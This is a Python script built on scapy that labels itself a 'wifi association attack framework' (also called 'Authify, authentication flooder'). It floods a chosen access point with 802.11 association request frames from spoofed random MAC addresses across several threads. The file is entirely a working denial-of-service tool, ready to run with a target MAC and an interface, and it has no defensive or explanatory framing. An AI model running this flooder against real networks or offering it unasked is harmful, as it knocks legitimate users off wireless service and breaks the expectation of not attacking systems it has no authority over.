from scapy.all import *
import random
import time
import threading
import argparse

# ignore the scuffed code below, it prints correctly but looks wierd here
s = """

    _                       _       _____ _ 
   / \   ___ ___  ___   ___(_)     |  ___(_)
  / _ \ / __/ __|/ _ \ / __| |_____| |_  | |
 / ___ \\\__ \__ \ (_) | (__| |_____|  _| | |
/_/   \_\___/___/\___/ \___|_|     |_|   |_|
                                            

wifi association attack framework

"""


# returns random mac address as string
def get_random_mac():
    mac = [
        0x00,
        0x16,
        0x3E,
        random.randint(0x00, 0x7F),
        random.randint(0x00, 0xFF),
        random.randint(0x00, 0xFF),
    ]
    return ":".join(map(lambda x: "%02x" % x, mac))


def assocify(mac, packet_count, verbosity, interface, destination):
    dot11 = Dot11(
        type=0,
        subtype=2,
        addr1=destination,
        addr2=mac,
        addr3=destination,
    )
    dot11elt_1 = Dot11Elt(ID="SSID", info=destination)
    dot11elt_2 = Dot11Elt(ID="Rates", info="\x82\x84\x0b\x16")

    frame = RadioTap() / dot11 / Dot11AssoReq() / dot11elt_1 / dot11elt_2
    sendp(frame, iface=interface, count=packet_count, verbose=verbosity)


if __name__ == "__main__":
    print(s)

    argparser = argparse.ArgumentParser(
        description="Authify, authentication flooder for 802.11"
    )
    argparser.add_argument(
        "-dst",
        "--destination_address",
        help="Destination MAC address of the packet: '11:11:11:11:11:11",
        required=True,
    )
    argparser.add_argument(
        "-c", "--count", help="Number of packets to sent.", default=1, type=int
    )
    argparser.add_argument(
        "-t", "--threads", help="Number of threads with unique MAC", default=1, type=int
    )
    argparser.add_argument(
        "-v",
        "--verbose",
        help="verbosity",
        default=1,
        choices=["0", "1"],
    )
    argparser.add_argument("-i", "--interface", help="Interface", required=True)

    args = vars(argparser.parse_args())

    print(args, "\n")

    arr = []
    n = args["threads"]
    for i in range(0, n):
        int(args["verbose"]) and print("starting thread{}".format(i))
        arr.append(
            threading.Thread(
                target=assocify,
                args=(
                    get_random_mac(),
                    args["count"],
                    int(args["verbose"]),
                    args["interface"],
                    args["destination_address"],
                ),
            )
        )
        arr[i].start()

    for i in range(0, n):
        arr[i].join()
